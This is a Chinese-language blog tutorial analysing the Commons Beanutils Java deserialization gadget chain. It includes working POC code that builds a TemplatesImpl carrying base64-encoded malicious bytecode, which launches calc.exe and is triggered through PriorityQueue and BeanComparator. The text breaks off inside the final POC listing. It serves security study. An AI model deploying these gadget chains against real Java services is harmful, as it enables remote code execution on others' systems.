        <content type="html"><![CDATA[<h2 id="Commons-Beanutils"><a href="#Commons-Beanutils" class="headerlink" title="Commons Beanutils"></a>Commons Beanutils</h2><p>Apache Commons Beanutils，是Apache Common下的一个工具集的另一个项目，它提供对普通Java类对象（JavaBean）的一些操作方法</p><p>JavaBean是一种特殊的Java类，主要用于封装数据并在应用程序中传递，其具有的特点：</p><ul><li>无参构造函数：JavaBean必须提供一个默认的无参构造函数</li><li>私有属性：所有属性必须声明为私有（private）</li><li>公共访问方法：通过<code>getter</code>和<code>setter</code>方法访问和修改属性值</li><li>可序列化：实现<code>Serializable</code></li></ul><p>demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 无参构造函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Getter 和 Setter 方法</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li><strong>jdk 8u71</strong></li><li><strong>commons-beanutils 1.8.3</strong></li></ul><p>pom.xml添加：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="相关类和方法"><a href="#相关类和方法" class="headerlink" title="相关类和方法"></a>相关类和方法</h2><h3 id="PropertyUtils"><a href="#PropertyUtils" class="headerlink" title="PropertyUtils"></a>PropertyUtils</h3><p>它是对JavaBean进行操作的工具类，可单独为某个属性进行值的操作的工具类。它是通过反射来操作Bean的属性</p><p>PropertyUtils类下提供了一些静态方法，便于开发者直接调用一些getter和setter方法：</p><ul><li>getProperty：返回指定Bean的指定属性的值，可以是简单也可以是嵌套，如<code>name</code> 或 <code>address.city</code>等 属性的<strong>名称或路径</strong></li><li>getSimpleProperty：返回指定Bean的指定<strong>简单（非嵌套）</strong>属性的值，只能是属性的单一名称如<code>name</code> </li><li>setProperty：设置指定Bean的指定属性的值</li><li>setSimpleProperty：设置指定Bean的指定属性的值</li></ul><p>demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name=<span class="string">&quot;b1uel0n3&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        CB m=<span class="keyword">new</span> <span class="title class_">CB</span>();</span><br><span class="line">        m.setName(<span class="string">&quot;B1uel0n3&quot;</span>);</span><br><span class="line">        String name=(String) PropertyUtils.getProperty(m,<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/df850557/image-20250913201232426.png" alt="image-20250913201232426"></p><p>PropertyUtils.getProperty&#x2F;setProperty方法，实际上是会调用对应类变量的getter和setter方法</p><h3 id="BeanComparator"><a href="#BeanComparator" class="headerlink" title="BeanComparator"></a>BeanComparator</h3><p>在BeanComparator类中存在compare方法：<br><img src="/archives/df850557/image-20250917201614475.png" alt="image-20250917201614475"></p><p>compare方法能调用PropertyUtils.getProperty方法来获取指定Bean的属性</p><h2 id="CB链分析"><a href="#CB链分析" class="headerlink" title="CB链分析"></a>CB链分析</h2><h3 id="CC2回顾"><a href="#CC2回顾" class="headerlink" title="CC2回顾"></a>CC2回顾</h3><p><img src="/archives/df850557/image-20250917201922510.png" alt="image-20250917201922510"></p><p>在学习CC2时我们知道我们是通过PriorityQueu.readObject作为入口调用PriorityQueue.heapify方法，在heapify方法中调用了PriorityQueue.siftDown方法，随后调用PriorityQueue.siftDownUsingComparator，最后调用TransformingComparator.compare从而调用this.transformer.transform()方法执行我们的TemplatesImpl字节码链的</p><p>TemplatesImpl字节码链POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">Impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        InvokerTransformer newtransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>],<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(newtransformer);</span><br><span class="line">        PriorityQueue queue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line"></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setValue(newtransformer,<span class="string">&quot;iMethodName&quot;</span>,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queueArray=(Object[]) getValue(queue,<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queueArray[<span class="number">0</span>]=Impl;</span><br><span class="line">        queueArray[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        Object o=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String filedname)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>而在CB链中则是将最后调用PriorityQueue.siftDownUsingComparator时：</p><p><img src="/archives/df850557/image-20250917203928259.png" alt="image-20250917203928259"></p><p>CC2是传入comparator参数为TransformingComparator，CB链则是传入参数为BeanComparator，随后调用BeanComparator.compare方法调用PropertyUtils.getProperty方法</p><p>同时如果PropertyUtils.getProperty方法内的参数可控：<br><img src="/archives/df850557/image-20250917204127555.png" alt="image-20250917204127555"></p><p>this.poperty在创建BeanComparator对象时可控，即如果o1或o2可控的话，那我们就能传入TemplatesImpl，而this.property传入outputProperties，这样执行PropertyUtils.getProperty就相当于调用TemplatesImpl.getOutputProperties:</p><p><img src="/archives/df850557/image-20250917204507719.png" alt="image-20250917204507719"></p><p>然后执行TemplatesImpl.newTransformer()触发TemplatesImpl恶意字节码</p><p>首先准备我们的TemplatesImpl对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;B1uel0n3&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object o,String filedname,Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=o.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(o,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/df850557/image-20250917210437615.png" alt="image-20250917210437615"></p><p>然后需要控制this.property变量，先看BeanCompare构造方法：<br><img src="/archives/df850557/image-20250917210957038.png" alt="image-20250917210957038"></p><p><img src="/archives/df850557/image-20250917211025014.png" alt="image-20250917211025014"></p><p><img src="/archives/df850557/image-20250917211043522.png" alt="image-20250917211043522"></p><p>直接创建BeanComparator对象传入outputProperties即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br></pre></td></tr></table></figure><p>随后准备序列化入口类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,beanComparator);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>之所以queue.add(1);是为了满足调用siftDown方法的条件，具体原理看我发的CC2链分析文章，这里不做赘述</p><p>利用反射来修改queue的值使调用<code>BeanComparator.compare</code>传入参数为TemplatesImpl恶意字节码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Object[] queueArray=(Object[]) getValue(queue,<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>]=templates;</span><br><span class="line">queueArray[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String filedname)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> field.get(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span 